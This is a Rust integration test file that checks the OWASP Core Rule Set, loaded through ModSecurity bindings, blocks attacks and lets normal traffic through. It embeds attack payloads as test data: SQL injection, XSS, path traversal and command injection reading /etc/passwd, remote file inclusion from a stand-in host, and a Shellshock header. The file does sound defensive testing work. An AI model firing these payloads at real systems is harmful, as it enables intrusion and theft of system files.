//! End-to-end validation against the OWASP Core Rule Set installed on this
//! system.
//!
//! The unit tests elsewhere use hand-written rules, which proves the FFI
//! plumbing but not that a real, large rule set behaves correctly through it.
//! These tests load the system CRS — `/etc/modsecurity/crs/crs-setup.conf` plus
//! `/usr/share/modsecurity-crs/rules/*.conf` on Debian/Ubuntu — and check that
//! attacks are blocked, that ordinary traffic is not, and that the engine's
//! configuration knobs still work through this crate.
//!
//! Both paths can be overridden with `MODSEC_CRS_SETUP` and `MODSEC_CRS_RULES`
//! (the latter is a glob handed to a SecLang `Include`). When the CRS is not
//! installed every test reports that it was skipped and passes, unless
//! `MODSEC_REQUIRE_CRS` is set, which turns a missing rule set into a failure.

use std::path::Path;
use std::sync::{Arc, Mutex};

use modsecurity::{Error, Intervention, ModSecurity, Rules, Transaction};

// ---------------------------------------------------------------------------
// Locating the rule set
// ---------------------------------------------------------------------------

const DEFAULT_SETUP: &str = "/etc/modsecurity/crs/crs-setup.conf";
const DEFAULT_RULES: &str = "/usr/share/modsecurity-crs/rules/*.conf";

/// Exclusion files Debian ships for site-local tuning. Both are empty out of
/// the box; they are included anyway so that a tuned host is tested as tuned.
const BEFORE_EXCLUSIONS: &str = "/etc/modsecurity/crs/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf";
const AFTER_EXCLUSIONS: &str = "/etc/modsecurity/crs/RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf";

fn setup_path() -> String {
    std::env::var("MODSEC_CRS_SETUP").unwrap_or_else(|_| DEFAULT_SETUP.to_owned())
}

fn rules_glob() -> String {
    std::env::var("MODSEC_CRS_RULES").unwrap_or_else(|_| DEFAULT_RULES.to_owned())
}

/// Returns false — after reporting the skip — when no CRS is installed.
///
/// `MODSEC_REQUIRE_CRS` turns the skip into a panic, so that CI cannot pass
/// these tests vacuously.
fn crs_available(test: &str) -> bool {
    let setup = setup_path();
    let glob = rules_glob();
    // The glob itself cannot be stat'd; check the blocking-evaluation file,
    // without which nothing in this file could possibly pass.
    let blocking = Path::new(&glob)
        .parent()
        .map(|dir| dir.join("REQUEST-949-BLOCKING-EVALUATION.conf"));
    let have = Path::new(&setup).is_file() && blocking.is_some_and(|p| p.is_file());

    if !have {
        let why = format!("OWASP CRS not found (setup: {setup}, rules: {glob})");
        assert!(
            std::env::var_os("MODSEC_REQUIRE_CRS").is_none(),
            "MODSEC_REQUIRE_CRS is set but {why}"
        );
        eprintln!("skipping {test}: {why}");
    }
    have
}

// ---------------------------------------------------------------------------
// Building the rule set
// ---------------------------------------------------------------------------

/// What `SecRuleEngine` is set to.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Engine {
    On,
    DetectionOnly,
}

impl Engine {
    fn directive(self) -> &'static str {
        match self {
            Self::On => "On",
            Self::DetectionOnly => "DetectionOnly",
        }
    }
}

/// The host-server settings a connector is expected to supply.
///
/// Debian ships these in `modsecurity.conf-recommended`, which belongs to the
/// Apache module rather than to the CRS, so an embedder of libmodsecurity has
/// to provide them. Without `SecRuleEngine On` the CRS detects and never
/// blocks, and without `SecRequestBodyAccess On` phase 2 sees no body.
fn prelude(engine: Engine, extra: &str) -> String {
    format!(
        "SecRuleEngine {}\n\
         SecRequestBodyAccess On\n\
         SecResponseBodyAccess On\n\
         SecResponseBodyMimeType text/plain text/html text/xml application/json\n\
         SecRequestBodyLimit 13107200\n\
         SecRequestBodyNoFilesLimit 131072\n\
         SecRequestBodyLimitAction Reject\n\
         SecResponseBodyLimit 1048576\n\
         SecResponseBodyLimitAction ProcessPartial\n\
         SecPcreMatchLimit 1000\n\
         SecPcreMatchLimitRecursion 1000\n\
         SecDebugLogLevel 0\n\
         {extra}\n",
        engine.directive()
    )
}

/// Loads the system CRS in the order `owasp-crs.load` prescribes.
///
/// That file cannot be handed to the parser directly: it uses Apache's
/// `IncludeOptional`, which libmodsecurity v3's SecLang parser rejects. Nor can
/// the glob go to [`Rules::add_file`], which opens exactly the path it is
/// given; globbing is a feature of the `Include` *directive*, so the glob is
/// fed in as a one-line rule file instead.
fn load(engine: Engine, extra: &str) -> Result<Rules, Error> {
    let mut rules = Rules::new()?;
    rules.add_plain(&prelude(engine, extra))?;
    rules.add_file(setup_path())?;
    if Path::new(BEFORE_EXCLUSIONS).is_file() {
        rules.add_file(BEFORE_EXCLUSIONS)?;
    }
    let count = rules.add_plain(&format!("Include {}\n", rules_glob()))?;
    assert!(
        count > 400,
        "expected the CRS to contribute hundreds of rules, got {count}"
    );
    if Path::new(AFTER_EXCLUSIONS).is_file() {
        rules.add_file(AFTER_EXCLUSIONS)?;
    }
    Ok(rules)
}

// ---------------------------------------------------------------------------
// Driving one request through every phase
// ---------------------------------------------------------------------------

/// One HTTP exchange, request and response together.
struct Exchange<'a> {
    method: &'a str,
    uri: &'a str,
    headers: &'a [(&'a str, &'a str)],
    body: &'a [u8],
    response_status: i32,
    response_headers: &'a [(&'a str, &'a str)],
    response_body: &'a [u8],
}

/// Headers a run-of-the-mill browser sends. Their *absence* is itself a CRS
/// finding (rules 920280/920300/920320), so every exchange carries them.
const BROWSER: &[(&str, &str)] = &[
    ("Host", "example.com"),
    (
        "User-Agent",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    ),
    ("Accept", "text/html,application/xhtml+xml,*/*;q=0.8"),
    ("Accept-Language", "en-US,en;q=0.9"),
];

impl<'a> Exchange<'a> {
    fn get(uri: &'a str) -> Self {
        Self {
            method: "GET",
            uri,
            headers: BROWSER,
            body: b"",
            response_status: 200,
            response_headers: &[("Content-Type", "text/html")],
            response_body: b"<html><body>hello</body></html>",
        }
    }

    fn with_headers(mut self, headers: &'a [(&'a str, &'a str)]) -> Self {
        self.headers = headers;
        self
    }

    fn with_body(mut self, body: &'a [u8]) -> Self {
        self.body = body;
        self
    }

    fn with_response_body(mut self, body: &'a [u8]) -> Self {
        self.response_body = body;
        self
    }
}

/// Where in the request lifecycle an intervention appeared.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Phase {
    Connection,
    Uri,
    RequestHeaders,
    RequestBody,
    ResponseHeaders,
    ResponseBody,
}

/// What a connector would have done with the exchange.
#[derive(Debug)]
enum Outcome {
    Allowed,
    Blocked(Phase, Intervention),
}

impl Outcome {
    /// Unwraps a block, checking it carries the status and rule id expected.
    #[track_caller]
    fn expect_blocked(self, phase: Phase, rule_id: &str) -> Intervention {
        match self {
            Self::Allowed => panic!(
                "expected a block at {phase:?} by rule {rule_id}, but the request was allowed"
            ),
            Self::Blocked(at, intervention) => {
                assert_eq!(at, phase, "blocked at the wrong phase: {intervention}");
                assert_eq!(
                    intervention.status, 403,
                    "unexpected status: {intervention}"
                );
                assert!(intervention.disruptive, "block was not disruptive");
                let log = intervention.log.as_deref().unwrap_or_default();
                assert!(
                    log.contains(rule_id),
                    "expected rule {rule_id} in the log line, got: {log}"
                );
                intervention
            }
        }
    }

    #[track_caller]
    fn expect_allowed(self, what: &str) {
        if let Self::Blocked(phase, intervention) = self {
            panic!("{what} should have been allowed, but was blocked at {phase:?}: {intervention}");
        }
    }
}

/// Runs one exchange through every phase, stopping at the first intervention
/// exactly as a connector would, and always completing the logging phase.
fn run(ms: &ModSecurity, rules: &Rules, ex: &Exchange<'_>) -> Result<Outcome, Error> {
    let mut tx = Transaction::new(ms, rules)?;
    let mut outcome = Outcome::Allowed;

    'phases: {
        if let Some(i) = tx.process_connection("203.0.113.9", 44321, "198.51.100.5", 80)? {
            outcome = Outcome::Blocked(Phase::Connection, i);
            break 'phases;
        }
        if let Some(i) = tx.process_uri(ex.uri, ex.method, "1.1")? {
            outcome = Outcome::Blocked(Phase::Uri, i);
            break 'phases;
        }
        for (name, value) in ex.headers {
            tx.add_request_header(name.as_bytes(), value.as_bytes())?;
        }
        if let Some(i) = tx.process_request_headers()? {
            outcome = Outcome::Blocked(Phase::RequestHeaders, i);
            break 'phases;
        }
        if !ex.body.is_empty() {
            if let Some(i) = tx.append_request_body(ex.body)? {
                outcome = Outcome::Blocked(Phase::RequestBody, i);
                break 'phases;
            }
        }
        if let Some(i) = tx.process_request_body()? {
            outcome = Outcome::Blocked(Phase::RequestBody, i);
            break 'phases;
        }
        for (name, value) in ex.response_headers {
            tx.add_response_header(name.as_bytes(), value.as_bytes())?;
        }
        if let Some(i) = tx.process_response_headers(ex.response_status, "HTTP/1.1")? {
            outcome = Outcome::Blocked(Phase::ResponseHeaders, i);
            break 'phases;
        }
        if let Some(i) = tx.append_response_body(ex.response_body)? {
            outcome = Outcome::Blocked(Phase::ResponseBody, i);
            break 'phases;
        }
        if let Some(i) = tx.process_response_body()? {
            outcome = Outcome::Blocked(Phase::ResponseBody, i);
            break 'phases;
        }
    }

    tx.process_logging()?;
    Ok(outcome)
}

/// True when this process is running under Valgrind.
///
/// Memcheck makes every rule evaluation one to two orders of magnitude slower,
/// and the CRS evaluates hundreds of regexes per request, so the repetitive
/// tests below shrink rather than turning the Valgrind run into a coffee
/// break. Detected from the `LD_PRELOAD` Valgrind installs for its own
/// replacement functions, which needs neither a dependency nor a feature flag.
fn under_valgrind() -> bool {
    std::env::var_os("LD_PRELOAD")
        .is_some_and(|preload| preload.to_string_lossy().contains("vgpreload"))
}

fn engine() -> ModSecurity {
    ModSecurity::new()
        .expect("engine")
        .with_connector_info("libmodsecurity3-rs-crs-tests/0.1")
        .expect("connector info")
}

// ---------------------------------------------------------------------------
// Attacks that must be blocked
// ---------------------------------------------------------------------------

/// Payloads lifted from the shapes CRS is built to catch. Each must reach the
/// inbound anomaly threshold on its own at paranoia level 1.
const ATTACKS: &[(&str, &str)] = &[
    (
        "sql injection in a query argument",
        "/search?q=1%27%20OR%20%271%27%3D%271%20--%20",
    ),
    (
        "union-select sql injection",
        "/item?id=-1%20UNION%20ALL%20SELECT%20NULL%2Cconcat%28user%28%29%29--",
    ),
    (
        "reflected xss",
        "/page?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
    ),
    (
        "xss via an event handler",
        "/page?name=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
    ),
    (
        "local file inclusion",
        "/view?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    ),
    (
        "remote file inclusion",
        "/index?page=http%3A%2F%2Fevil.example.net%2Fshell.txt%3F",
    ),
    (
        "os command injection",
        "/ping?host=127.0.0.1%3B%20cat%20%2Fetc%2Fpasswd",
    ),
    (
        "php object injection",
        "/p?data=O%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A4%3A%22exec%22%3Bs%3A2%3A%22id%22%3B%7D",
    ),
];

#[test]
fn known_attacks_are_blocked() {
    if !crs_available("known_attacks_are_blocked") {
        return;
    }
    let ms = engine();
    let rules = load(Engine::On, "").expect("load CRS");

    for (what, uri) in ATTACKS {
        let outcome = run(&ms, &rules, &Exchange::get(uri)).expect("run");
        let intervention = outcome.expect_blocked(Phase::RequestBody, "949110");
        let log = intervention.log.unwrap_or_default();
        assert!(
            log.contains("Inbound Anomaly Score Exceeded"),
            "{what}: unexpected log line: {log}"
        );
    }
}

#[test]
fn shellshock_in_a_header_is_blocked() {
    if !crs_available("shellshock_in_a_header_is_blocked") {
        return;
    }
    let ms = engine();
    let rules = load(Engine::On, "").expect("load CRS");

    let headers = [
        ("Host", "example.com"),
        ("User-Agent", "() { :; }; /bin/bash -c 'cat /etc/passwd'"),
        ("Accept", "*/*"),
    ];
    run(&ms, &rules, &Exchange::get("/").with_headers(&headers))
        .expect("run")
        .expect_blocked(Phase::RequestBody, "949110");
}

#[test]
fn scanner_user_agents_are_blocked() {
    if !crs_available("scanner_user_agents_are_blocked") {
        return;
    }
    let ms = engine();
    let rules = load(Engine::On, "").expect("load CRS");

    for agent in [
        "sqlmap/1.7#stable (http://sqlmap.org)",
        "Nikto/2.5.0",
        "nmap-nse",
    ] {
        let headers = [
            ("Host", "example.com"),
            ("User-Agent", agent),
            ("Accept", "*/*"),
        ];
        run(&ms, &rules, &Exchange::get("/").with_headers(&headers))
            .expect("run")
            .expect_blocked(Phase::RequestBody, "949110");
    }
}

#[test]
fn attacks_in_a_request_body_are_blocked() {
    if !crs_available("attacks_in_a_request_body_are_blocked") {
        return;
    }
    let ms = engine();
    let rules = load(Engine::On, "").expect("load CRS");

    let headers = [
        ("Host", "example.com"),
        ("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0"),
        ("Accept", "*/*"),
        ("Content-Type", "application/x-www-form-urlencoded"),
    ];
    let mut ex = Exchange::get("/login").with_headers(&headers);
    ex.method = "POST";
    let body = b"username=admin%27%20OR%201%3D1--%20&password=x";

    run(&ms, &rules, &ex.with_body(body))
        .expect("run")
        .expect_blocked(Phase::RequestBody, "949110");
}

#[test]
fn response_data_leakage_is_blocked() {
    if !crs_available("response_data_leakage_is_blocked") {
        return;
    }
    let ms = engine();
    let rules = load(Engine::On, "").expect("load CRS");

    let leaks: [&[u8]; 2] = [
        b"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version",
        b"<?php $conn = mysqli_connect($host, $user, $pass); ?>",
    ];
    for leak in leaks {
        run(
            &ms,
            &rules,
            &Exchange::get("/oops").with_response_body(leak),
        )
        .expect("run")
        .expect_blocked(Phase::ResponseBody, "959100");
    }
}

// ---------------------------------------------------------------------------
// Traffic that must get through
// ---------------------------------------------------------------------------

#[test]
fn ordinary_traffic_is_allowed() {
    if !crs_available("ordinary_traffic_is_allowed") {
        return;
    }
    let ms = engine();
    let rules = load(Engine::On, "").expect("load CRS");

    for uri in [
        "/",
        "/index.html",
        "/search?q=rust+ffi+bindings",
        "/articles/2026/11/a-post-about-sql-and-scripts",
        "/assets/app.min.js?v=8f21c0",
        "/api/v1/users?page=2&per_page=50&sort=-created_at",
    ] {
        run(&ms, &rules, &Exchange::get(uri))
            .expect("run")
            .expect_allowed(uri);
    }
}

#[test]
fn ordinary_form_and_json_posts_are_allowed() {
    if !crs_available("ordinary_form_and_json_posts_are_allowed") {
        return;
    }
    let ms = engine();
    let rules = load(Engine::On, "").expect("load CRS");

    let form_headers = [
        ("Host", "example.com"),
        ("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0"),
        ("Accept", "text/html"),
        ("Content-Type", "application/x-www-form-urlencoded"),
    ];
    let mut form = Exchange::get("/comments").with_headers(&form_headers);
    form.method = "POST";
    run(
        &ms,
        &rules,
        &form.with_body(b"author=Jane+Doe&comment=Nice+write-up%2C+thanks%21&rating=5"),
    )
    .expect("run")
    .expect_allowed("a form post");

    let json_headers = [
        ("Host", "example.com"),
        ("User-Agent", "libmodsecurity3-rs-tests/0.1"),
        ("Accept", "application/json"),
        ("Content-Type", "application/json"),
    ];
    let mut json = Exchange::get("/api/v1/users").with_headers(&json_headers);
    json.method = "POST";
    run(
        &ms,
        &rules,
        &json.with_body(br#"{"name":"Jane Doe","email":"jane@example.com","roles":["editor"]}"#),
    )
    .expect("run")
    .expect_allowed("a json post");
}

// ---------------------------------------------------------------------------
// The engine's own switches still work through this crate
// ---------------------------------------------------------------------------

#[test]
fn detection_only_reports_without_blocking() {
    if !crs_available("detection_only_reports_without_blocking") {
        return;
    }
    let seen = Arc::new(Mutex::new(Vec::<String>::new()));
    let sink = Arc::clone(&seen);

    let mut ms = engine();
    ms.set_log_callback(move |line| {
        sink.lock()
            .unwrap_or_else(|e| e.into_inner())
            .push(String::from_utf8_lossy(line).into_owned());
    });
    let rules = load(Engine::DetectionOnly, "").expect("load CRS");

    run(&ms, &rules, &Exchange::get(ATTACKS[0].1))
        .expect("run")
        .expect_allowed("an attack in DetectionOnly mode");

    let lines = seen.lock().unwrap_or_else(|e| e.into_inner());
    assert!(
        !lines.is_empty(),
        "DetectionOnly suppressed the block, but logged nothing either"
    );
    assert!(
        lines
            .iter()
            .any(|l| l.contains("942") || l.contains("949110")),
        "no CRS rule in the log output: {lines:?}"
    );
}

#[test]
fn raising_the_anomaly_threshold_lets_the_attack_through() {
    if !crs_available("raising_the_anomaly_threshold_lets_the_attack_through") {
        return;
    }
    let ms = engine();
    // Set before the CRS loads, which is where a site's own tuning goes: rule
    // 901100 only supplies a default when the threshold is still unset.
    let rules = load(
        Engine::On,
        "SecAction \"id:900000,phase:1,nolog,pass,t:none,\
         setvar:tx.inbound_anomaly_score_threshold=10000\"",
    )
    .expect("load CRS");

    run(&ms, &rules, &Exchange::get(ATTACKS[0].1))
        .expect("run")
        .expect_allowed("an attack scored below a raised threshold");
}

#[test]
fn blocking_needs_phase_two_to_run() {
    if !crs_available("blocking_needs_phase_two_to_run") {
        return;
    }
    let ms = engine();
    let rules = load(Engine::On, "").expect("load CRS");

    // CRS makes its decision in rule 949110, which is phase 2. A connector that
    // stops after the request headers therefore sees no intervention even for a
    // request the CRS has already scored past the threshold — the block is not
    // lost, it simply has not happened yet.
    let mut tx = Transaction::new(&ms, &rules).expect("transaction");
    tx.process_connection("203.0.113.9", 44321, "198.51.100.5", 80)
        .expect("connection");
    tx.process_uri(ATTACKS[0].1, "GET", "1.1").expect("uri");
    for (name, value) in BROWSER {
        tx.add_request_header(name.as_bytes(), value.as_bytes())
            .expect("header");
    }
    assert!(
        tx.process_request_headers().expect("headers").is_none(),
        "phase 1 blocked; this test's premise no longer holds"
    );
    let intervention = tx.process_request_body().expect("body");
    assert!(
        intervention.is_some_and(|i| i.status == 403),
        "phase 2 did not block the attack"
    );
    tx.process_logging().expect("logging");
}

// ---------------------------------------------------------------------------
// Concurrency
// ---------------------------------------------------------------------------

#[test]
fn one_rule_set_serves_many_threads() {
    if !crs_available("one_rule_set_serves_many_threads") {
        return;
    }
    let ms = engine();
    let rules = load(Engine::On, "").expect("load CRS");

    let (workers, rounds) = if under_valgrind() { (2, 4) } else { (8, 25) };
    std::thread::scope(|scope| {
        for worker in 0..workers {
            let ms = &ms;
            let rules = &rules;
            scope.spawn(move || {
                for round in 0..rounds {
                    // Alternate so that each thread exercises both verdicts.
                    if (worker + round) % 2 == 0 {
                        let (_, uri) = ATTACKS[(worker + round) % ATTACKS.len()];
                        run(ms, rules, &Exchange::get(uri))
                            .expect("run")
                            .expect_blocked(Phase::RequestBody, "949110");
                    } else {
                        run(ms, rules, &Exchange::get("/search?q=hello+world"))
                            .expect("run")
                            .expect_allowed("benign request");
                    }
                }
            });
        }
    });
}

#[test]
fn rule_sets_load_concurrently() {
    if !crs_available("rule_sets_load_concurrently") {
        return;
    }
    // The SecLang parser is not reentrant; `Rules` serialises it internally.
    // Loading the whole CRS from four threads at once is the heaviest exercise
    // of that lock available.
    let loaders = if under_valgrind() { 2 } else { 4 };
    std::thread::scope(|scope| {
        for _ in 0..loaders {
            scope.spawn(|| {
                let ms = engine();
                let rules = load(Engine::On, "").expect("load CRS");
                run(&ms, &rules, &Exchange::get(ATTACKS[0].1))
                    .expect("run")
                    .expect_blocked(Phase::RequestBody, "949110");
            });
        }
    });
}
